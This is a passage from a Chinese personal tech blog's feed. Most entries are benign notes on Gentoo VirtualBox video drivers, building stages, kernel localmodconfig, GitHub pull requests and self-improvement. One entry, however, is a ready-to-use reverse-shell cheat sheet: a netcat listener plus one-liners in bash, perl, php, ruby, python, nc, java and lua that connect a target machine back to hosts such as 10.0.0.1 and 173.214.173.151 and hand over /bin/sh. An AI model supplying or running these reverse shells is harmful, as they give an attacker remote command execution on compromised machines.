TransPend-</div><div class="line">                LnkCap: Port #0, Speed 2.5GT/s, Width x16, ASPM L0s L1, Exit Latency L0s &lt;512ns, L1 &lt;4us</div><div class="line">                        ClockPM- Surprise- LLActRep- BwNot- ASPMOptComp-</div><div class="line">                LnkCtl: ASPM L0s Enabled; RCB 128 bytes Disabled- CommClk+</div><div class="line">                        ExtSynch- ClockPM- AutWidDis- BWInt- AutBWInt-</div><div class="line">                LnkSta: Speed 2.5GT/s, Width x16, TrErr- Train- SlotClk+ DLActive- BWMgmt- ABWMgmt-</div><div class="line">        Capabilities: [100 v1] Virtual Channel</div><div class="line">                Caps:   LPEVC=0 RefClk=100ns PATEntryBits=1</div><div class="line">                Arb:    Fixed- WRR32- WRR64- WRR128-</div><div class="line">                Ctrl:   ArbSelect=Fixed</div><div class="line">                Status: InProgress-</div><div class="line">                VC0:    Caps:   PATOffset=00 MaxTimeSlots=1 RejSnoopTrans-</div><div class="line">                        Arb:    Fixed- WRR32- WRR64- WRR128- TWRR128- WRR256-</div><div class="line">                        Ctrl:   Enable+ ID=0 ArbSelect=Fixed TC/VC=01</div><div class="line">                        Status: NegoPending- InProgress-</div><div class="line">        Capabilities: [128 v1] Power Budgeting &lt;?&gt;</div><div class="line">        Capabilities: [600 v1] Vendor Specific Information: ID=0001 Rev=1 Len=024 &lt;?&gt;</div><div class="line">        Kernel driver in use: nvidia</div><div class="line">        Kernel modules: nouveau, nvidia_drm, nvidia</div></pre></td></tr></table></figure><p>注:</p><p>之前virtualbox的驱动总是不能成功, <strong>改为vesa折中解决</strong>.          </p><p>具体为删除virtualbox驱动, emerge -C virtualbox-guest-additions          </p><p>如果启动还是加载vboxvideo等驱动, </p><p>那就直接删除重新安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rm /lib/modules/* -rf  </div><div class="line">cd /usr/src/linux &amp;&amp;  make modules_install</div><div class="line">emerge -av @module-rebuild</div></pre></td></tr></table></figure><p>并且添加/etc/X11/xorg.conf.d/10-monitor.conf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Section "Monitor"</div><div class="line">    Identifier    "Monitor0"</div><div class="line">EndSection</div><div class="line"></div><div class="line">Section "Device"</div><div class="line">    Identifier    "Device0"</div><div class="line">    Driver        "vesa" #Choose the driver used for this monitor</div><div class="line">EndSection</div><div class="line"></div><div class="line">Section "Screen"</div><div class="line">    Identifier    "Screen0"  #Collapse Monitor and Device section to Screen section</div><div class="line">    Device        "Device0"</div><div class="line">    Monitor       "Monitor0"</div><div class="line">    DefaultDepth  16 #Choose the depth (16||24)</div><div class="line">    SubSection "Display"</div><div class="line">        Depth     16</div><div class="line">        Modes     "1024x768_75.00" #Choose the resolution</div><div class="line">    EndSubSection</div><div class="line">EndSection</div></pre></td></tr></table></figure><p>这样省了virtualbox 驱动版本等匹配问题.当然性能也下降了.</p><p>当然我自己还挖了个坑 那就是还要删除</p><p> /etc/local.d/nvidia.start<br>不然重启又修改了</p><p><img src="virtualbox.JPG" alt="virtualbox"></p><p>当然安装vboxvideo 会提高性能 只要在/etc/portage/make.conf添加</p><blockquote><p>VIDEO_CARDS=”virtualbox vesa fbdev”</p></blockquote><p>并更新下系统就可以</p><blockquote><p>emerge -avtuDN world</p></blockquote><p>如果/etc/X11/xorg.conf 和/etc/X11/xorg.conf.d 不会配置 建议直接删除就可以了</p><p>同时可参考:</p><p><a href="https://wiki.gentoo.org/wiki/VirtualBox" target="_blank" rel="external">https://wiki.gentoo.org/wiki/VirtualBox</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;显卡-&amp;gt;驱动-&amp;gt;xorg-&amp;gt;gnome-&amp;gt;gui&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;查看显卡：lspci  | grep -i VGA&lt;/p&gt;
&lt;p&gt;查看驱动：lspci  -vvv&lt;br&gt;​          &lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>gentoo_stage_diy</title>
    <link href="http://demonelf.github.io/SYSTEM/gentoo_stage_diy.html"/>
    <id>http://demonelf.github.io/SYSTEM/gentoo_stage_diy.html</id>
    <published>2019-08-29T05:12:31.507Z</published>
    <updated>2019-08-29T05:09:48.911Z</updated>
    
    <content type="html"><![CDATA[<p>stage1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">包含bootstrap.sh，</div><div class="line">scripts/bootstrap.sh用于安装</div><div class="line">glibc、gcc、zlib、binutils、textinfo、ncurses、gettext、sed、emerge、portage等</div><div class="line">创建stage2 包含emerge的环境</div><div class="line">执行：scripts/bootstrap.sh</div></pre></td></tr></table></figure></p><p>stage2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">包含了完整的emerge的环境</div><div class="line">构建system系统，编译没有替代物的系统软件包。</div><div class="line">执行：emerge -e system</div></pre></td></tr></table></figure></p><p>构想：</p><ol><li><p>stage1可以通过lfs方法得到</p><p>stage1要保证能运行bootstrap.sh和emerge </p><p> bootstrap.sh：bash</p><p> portage:bash python</p></li><li><p>stage1 在通过bootstrap.sh生成stage2</p><p>参考： <a href="https://wiki.gentoo.org/wiki/Project:Prefix/Bootstrap" target="_blank" rel="external">https://wiki.gentoo.org/wiki/Project:Prefix/Bootstrap</a></p></li><li><p>我们可以运行：emerge -e system 生成官方提供的的stage3了。</p></li></ol><pre><code>以上stage2环境可以由lfs替代.直接在lfs或其它系统上安装porage，所以共有两种安装方法：第一种：    1.下载stage1     2.bootstrap.sh    3.emerge system    4.stage3正常安装第二种：    1.创建lfs    2.安装portage    3.emerge system    4.emerge world参考：https://wiki.gentoo.org/wiki/Portage</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;stage1：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;包含bootstrap.sh，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;scripts/bootstrap.sh用于安装&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;glibc、gcc、zlib、binutils、textinfo、ncurses、gettext、sed、emerge、portage等&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;创建stage2 包含emerge的环境&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;执行：scripts/bootstrap.sh&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;stage2:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;包含了完整的emerge的环境&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;构建system系统，编译没有替代物的系统软件包。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;执行：emerge -e system&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;构想：&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux下NC反弹shell命令</title>
    <link href="http://demonelf.github.io/SYSTEM/Linux%E4%B8%8BNC%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4.html"/>
    <id>http://demonelf.github.io/SYSTEM/Linux下NC反弹shell命令.html</id>
    <published>2019-08-29T05:12:31.504Z</published>
    <updated>2019-08-29T05:09:41.711Z</updated>
    
    <content type="html"><![CDATA[<p>本机开启监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 4444</div><div class="line">nc -vvlp 4444</div></pre></td></tr></table></figure><p>目标机器开启反弹<br>bash版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure><p>perl版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</div></pre></td></tr></table></figure><p>php版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</div></pre></td></tr></table></figure><p>ruby版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</div></pre></td></tr></table></figure><p>python版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div></pre></td></tr></table></figure><p>nc版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 1234</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</div><div class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</div></pre></td></tr></table></figure><p>java版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure><p>lua版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</div></pre></td></tr></table></figure><p>NC版本不使用-e参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div><div class="line">/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe</div><div class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</div><div class="line"></div><div class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本机开启监听：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;nc -lvnp 4444&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nc -vvlp 4444&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机器开启反弹&lt;br&gt;bash版本：&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux 内核编译 —— make localmodconfig 简化内核配置流程  </title>
    <link href="http://demonelf.github.io/SYSTEM/Linux%20%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%20%E2%80%94%E2%80%94%20make%20localmodconfig%20%E7%AE%80%E5%8C%96%E5%86%85%E6%A0%B8%E9%85%8D%E7%BD%AE%E6%B5%81%E7%A8%8B%20%20.html"/>
    <id>http://demonelf.github.io/SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  .html</id>
    <published>2019-08-29T05:12:31.502Z</published>
    <updated>2019-08-29T05:09:33.928Z</updated>
    
    <content type="html"><![CDATA[<p>简介：<br>前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。<br>刚刚找了一下这个方面的资料，分享一下。</p><p>Most people uses the kernel shipped by distros - and that’s good. But some people like to compile their own kernels from kernel.org, or maybe they like following the Linux development and want to try it. Configuring your own kernel, however, has become a very difficult and tedious task - there’re too many options, and some times userspace software will stop working if you don’t enable some key option. You can use a standard distro .config file, but it takes too much time to compile all the options it enables.</p><p>To make the process of configuration easier, a new build target has been added: make localmodconfig. It runs “lsmod” to find all the modules loaded on the current running system. It will read all the Makefiles to map which CONFIG enables a module. It will read the Kconfig files to find the dependencies and selects that may be needed to support a CONFIG. Finally, it reads the .config file and removes any module “=m” that is not needed to enable the currently loaded modules. With this tool, you can strip a distro .config of all the unuseful drivers that are not needed in our machine, and it will take much less time to build the kernel. There’s an additional “make localyesconfig” target, in case you don’t want to use modules and/or initrds.</p><p>以上内容摘自：Kernel Newbies。<br>大概意思是说， make localmodconfig 会执行 lsmod 命令查看当前系统中加载了哪些模块 (Modules)， 并最后将原来的 .config 中不需要的模块去掉，仅保留前面 lsmod 出来的这些模块，从而简化了内核的配置过程。 </p><p>这样做确实方便了很多，但是也有个缺点：该方法仅能使编译出的内核支持当前内核已经加载的模块。<br>因为该方法使用的是 lsmod 的结果，如果有的模块当前没有加载，那么就不会编到新的内核中。<br>例如，我有的时候需要制作 squashfs ， 因此在当前的内核中，将 squashfs 编译成了模块。 当使用 make localmodconfig 来配置 Kernel 的时候，如果当前系统中没有加载这个模块， 那么新编出来的内核中就不会将 squashfs 编译成模块，在新的内核中就没办法使用这个模块了。</p><p>所以建议在使用 make localmodconfig 之前，首先折腾一下系统，插个优盘，开开摄像头之类， 以便让内核加载上平时使用时候所需要的模块；执行 make localmodconfig 之后，再执行一下 make menuconfig 来手动检查一下， 是否还有其他模块需要手动选择。</p><p>这样，内核的编译可以分成如下几个步骤来进行：</p><ol><li><p>下载解压内核源码：<a href="http://www.kernel.org，" target="_blank" rel="external">http://www.kernel.org，</a> </p></li><li><p>折腾一下系统，让它将合适的 module 都加载上。</p></li><li><p>执行 make localmodconfig 精减不需要的模块。</p></li><li><p>执行 make menuconfig ，检查一下是否有自己需要的模块没有选上。</p></li><li><p>执行 make 进行编译</p></li><li><p>执行 make modules_install 安装模块</p></li><li><p>执行 make install 安装内核</p></li><li><p>编辑 /boot/grub/grub.conf 或者 /boot/grub/menu.lst 添加新的引导菜单。</p></li><li><p>重启并以新的内核启动。</p><p>OK, that’s all.</p></li></ol><p>Author:yangyingchao, 2010-09-13</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简介：&lt;br&gt;前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。&lt;br&gt;刚刚找了一下这个方面的资料，分享一下。&lt;/p&gt;
&lt;p&gt;Most people uses the kernel shipped by distros - and that’s good. But some people like to compile their own kernels from kernel.org, or maybe they like following the Linux development and want to try it. Configuring your own kernel, however, has become a very difficult and tedious task - there’re too many options, and some times userspace software will stop working if you don’t enable some key option. You can use a standard distro .config file, but it takes too much time to compile all the options it enables.&lt;/p&gt;
&lt;p&gt;To make the process of configuration easier, a new build target has been added: make localmodconfig. It runs “lsmod” to find all the modules loaded on the current running system. It will read all the Makefiles to map which CONFIG enables a module. It will read the Kconfig files to find the dependencies and selects that may be needed to support a CONFIG. Finally, it reads the .config file and removes any module “=m” that is not needed to enable the currently loaded modules. With this tool, you can strip a distro .config of all the unuseful drivers that are not needed in our machine, and it will take much less time to build the kernel. There’s an additional “make localyesconfig” target, in case you don’t want to use modules and/or initrds.&lt;/p&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>Github上怎么修改别人的项目并且提交给原作者！图文并茂！</title>
    <link href="http://demonelf.github.io/SYSTEM/Github%E4%B8%8A%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%E5%88%AB%E4%BA%BA%E7%9A%84%E9%A1%B9%E7%9B%AE%E5%B9%B6%E4%B8%94%E6%8F%90%E4%BA%A4%E7%BB%99%E5%8E%9F%E4%BD%9C%E8%80%85%EF%BC%81%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82%EF%BC%81.html"/>
    <id>http://demonelf.github.io/SYSTEM/Github上怎么修改别人的项目并且提交给原作者！图文并茂！.html</id>
    <published>2019-08-29T05:12:31.499Z</published>
    <updated>2019-08-29T05:09:26.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Github上怎么修改别人的项目并且提交给原作者！图文并茂！"><a href="#Github上怎么修改别人的项目并且提交给原作者！图文并茂！" class="headerlink" title="Github上怎么修改别人的项目并且提交给原作者！图文并茂！"></a>Github上怎么修改别人的项目并且提交给原作者！图文并茂！</h1><hr><blockquote><p>写这篇博客的初衷，是因为我的项目Only需要一些朋友一起参与进来，但是很多的<a href="http://lib.csdn.net/base/git" title="Git知识库" target="_blank" rel="external">Git</a>都不是很熟练，其实<a href="http://lib.csdn.net/base/git" title="Git知识库" target="_blank" rel="external">版本控制</a>这种东西没有什么难度的，只要稍微掌握以下就好了，如果有兴趣的话也可以到Only这个项目进来</p></blockquote><ul><li>Only:<a href="https://github.com/LiuGuiLinAndroid/Only" target="_blank" rel="external">https://github.com/LiuGuiLinAndroid/Only</a></li></ul><blockquote><p>好的，不多说，直接开车了，我们先简单的找一个项目，比如这个项目，我需要更改他的内容，我们就直接fork这个项目</p></blockquote><p><img src="http://img.blog.csdn.net/20160812184548322" alt="这里写图片描述"></p><blockquote><p>紧接着你就可以看到这个项目已经被你fork了</p></blockquote><p><img src="http://img.blog.csdn.net/20160812184707354" alt="这里写图片描述"></p><blockquote><p>现在我们就可以直接clone下我们自己的项目来了</p></blockquote><p><code class="hljs php has-numbering">git clone xxxx</code></p><blockquote><p>我们clone下来之后就可以更改了，这里我就在说明文件里加一句话：到此一游就好了，紧接着，我们提交</p></blockquote><p><img src="http://img.blog.csdn.net/20160812185041421" alt="这里写图片描述"></p><blockquote><p>到这里，我们就可以在Github上看到我们自己的更新了</p></blockquote><p><img src="http://img.blog.csdn.net/20160812185447413" alt="这里写图片描述"></p><blockquote><p>然后我们点击项目上的Pull request去请求</p></blockquote><p><img src="http://img.blog.csdn.net/20160812185521241" alt="这里写图片描述"></p><blockquote><p>在这里写上我们的更新日志和更改了什么东西，然后点击Create pull request</p></blockquote><p><img src="http://img.blog.csdn.net/20160812185605101" alt="这里写图片描述"></p><blockquote><p>到这里，就没有我们什么事了，我们只要等待作者收到邮件同意我们的更新就好了，那作者哪里做了什么呢？</p><p>当他收到这个请求就会看到</p></blockquote><p><img src="http://img.blog.csdn.net/20160812185656071" alt="这里写图片描述"></p><blockquote><p>只要点击同意，我们的提交就合并到他的代码里去了，就可以看到提交信息了</p></blockquote><p><img src="http://img.blog.csdn.net/20160812185722977" alt="这里写图片描述"></p><blockquote><p>这个时候你的代码就静静的躺在作者的Github里了</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Github上怎么修改别人的项目并且提交给原作者！图文并茂！&quot;&gt;&lt;a href=&quot;#Github上怎么修改别人的项目并且提交给原作者！图文并茂！&quot; class=&quot;headerlink&quot; title=&quot;Github上怎么修改别人的项目并且提交给原作者！图文并茂！&quot;&gt;&lt;/a&gt;Github上怎么修改别人的项目并且提交给原作者！图文并茂！&lt;/h1&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;写这篇博客的初衷，是因为我的项目Only需要一些朋友一起参与进来，但是很多的&lt;a href=&quot;http://lib.csdn.net/base/git&quot; title=&quot;Git知识库&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Git&lt;/a&gt;都不是很熟练，其实&lt;a href=&quot;http://lib.csdn.net/base/git&quot; title=&quot;Git知识库&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;版本控制&lt;/a&gt;这种东西没有什么难度的，只要稍微掌握以下就好了，如果有兴趣的话也可以到Only这个项目进来&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
    
  </entry>
  
  <entry>
    <title>如何提高自己</title>
    <link href="http://demonelf.github.io/LIVE/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E8%87%AA%E5%B7%B1.html"/>
    <id>http://demonelf.github.io/LIVE/如何提高自己.html</id>
    <published>2019-08-29T05:12:31.496Z</published>
    <updated>2019-08-29T05:08:37.584Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。</p><p> <a href="http://jingyan.baidu.com/album/0320e2c1cc85031b87507b90.html?picindex=2" target="_blank" rel="external"><img src="http://h.hiphotos.baidu.com/exp/w=500/sign=bffada058218367aad897fdd1e728b68/279759ee3d6d55fbbd50610a69224f4a20a4dd03.jpg" alt="如何提高自己在别人心目中的地位"></a></p></li><li><p>为人真诚。一个人经常的耍点小聪明，经常的觉得别人永远在自己的手掌中，那么这样的人不仅赢不了别人的喜欢，而且还会让自己孤立。</p><p> <a href="http://jingyan.baidu.com/album/0320e2c1cc85031b87507b90.html?picindex=3" target="_blank" rel="external"><img src="http://e.hiphotos.baidu.com/exp/w=500/sign=4a923f890e7b02080cc93fe152d8f25f/f7246b600c338744cf6c3850550fd9f9d72aa074.jpg" alt="如何提高自己在别人心目中的地位"></a></p></li><li><p>助人为乐。帮助别人，快乐自己。经常帮助别人的人经常让别人觉得自己的善良，让别人感受到自己的亲近。</p><p> <a href="http://jingyan.baidu.com/album/0320e2c1cc85031b87507b90.html?picindex=4" target="_blank" rel="external"><img src="http://d.hiphotos.baidu.com/exp/w=500/sign=92e836d232d3d539c13d0fc30a87e927/7aec54e736d12f2ee23ab84c4bc2d562853568da.jpg" alt="如何提高自己在别人心目中的地位"></a></p></li><li><p>优秀。让自己变得优秀，优秀的人没有人会不喜欢，没有人会不尊重，因此让自己努力变成一个某一方面优秀的人，可以让自己受到别人的尊重。</p><p> <a href="http://jingyan.baidu.com/album/0320e2c1cc85031b87507b90.html?picindex=5" target="_blank" rel="external"><img src="http://f.hiphotos.baidu.com/exp/w=500/sign=1b1aa99ebd014a90813e46bd99773971/a8ec8a13632762d0f20eb293a4ec08fa513dc6ed.jpg" alt="如何提高自己在别人心目中的地位"></a></p></li><li><p>不小看别人。三十年河东，三十年河西。焉知别人今后就没有翻身的一天，所以对人千万不要抬着头。</p><p> <a href="http://jingyan.baidu.com/album/0320e2c1cc85031b87507b90.html?picindex=6" target="_blank" rel="external"><img src="http://g.hiphotos.baidu.com/exp/w=500/sign=82ac0b28309b033b2c88fcda25cf3620/8c1001e93901213fee8858f050e736d12f2e9566.jpg" alt="如何提高自己在别人心目中的地位"></a></p></li><li><p>不骄不燥。做人还不能骄傲，也不能浮燥，骄傲的人容易落后，浮燥的人做事情容易失败。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;http://jingyan.baidu.com/album/0320e2c1cc85031b87507b90.html?pici
      
    
    </summary>
    
      <category term="LIVE" scheme="http://demonelf.github.io/categories/LIVE/"/>
    
    
  </entry>
  
</feed>
